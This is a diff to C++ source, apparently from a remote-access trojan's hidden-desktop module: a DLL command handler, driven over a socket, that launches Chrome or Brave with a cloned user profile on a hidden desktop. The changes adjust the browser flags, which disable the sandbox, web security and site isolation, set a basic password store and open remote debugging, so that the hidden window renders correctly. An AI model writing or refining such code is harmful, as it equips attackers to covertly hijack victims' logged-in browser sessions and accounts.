@@ -1334,17 +1334,19 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
 
                     send_status("'" + wstring_to_utf8(bInfo.name) + "' tarayıcı açılıyor...");
 
-                    // Common flags for stability and bypass
+                    // Common flags for stability, isolation and GUI visibility on hidden desktop
                     cmdLineStr = L"\"" + bInfo.exe + L"\" --user-data-dir=\"" + clonePath +
-                                 L"\" --no-sandbox --test-type --password-store=basic --disable-gpu --no-first-run "
-                                 L"--no-default-browser-check --disable-blink-features=AutomationControlled "
+                                 L"\" --no-sandbox --test-type --password-store=basic --disable-gpu "
+                                 L"--disable-software-rasterizer --disable-gpu-compositing --disable-gpu-sandbox "
+                                 L"--no-first-run --no-default-browser-check --disable-blink-features=AutomationControlled "
                                  L"--allow-running-insecure-content --disable-web-security "
                                  L"--disable-features=CalculateNativeWinOcclusion,IsolateOrigins,site-per-process "
-                                 L"--disable-infobars --remote-debugging-port=0";
+                                 L"--disable-backgrounding-occluded-windows --disable-renderer-backgrounding "
+                                 L"--window-size=1280,720 --start-maximized --disable-infobars --remote-debugging-port=0";
 
-                    // Brave specific GUI fix
+                    // Brave specific isolation
                     if (requestedPath == "brave.exe") {
-                        cmdLineStr += L" --disable-brave-update --disable-brave-rewards --disable-software-rasterizer --disable-gpu-sandbox --disable-gpu-compositing";
+                        cmdLineStr += L" --disable-brave-update --disable-brave-rewards";
                     }
                 } else {
                     cmdLineStr = path;
@@ -1360,8 +1362,9 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                 si.wShowWindow  = SW_SHOW;
 
                 PROCESS_INFORMATION pi = { 0 };
+                // Using 0 for dwCreationFlags to ensure GUI initializes correctly on some Windows versions
                 if (CreateProcessW(NULL, cmdLine.data(), NULL, NULL, FALSE,
-                                   CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
+                                   0, NULL, NULL, &si, &pi)) {
                     CloseHandle(pi.hProcess);
                     CloseHandle(pi.hThread);
                     g_forceFullFrame = true;
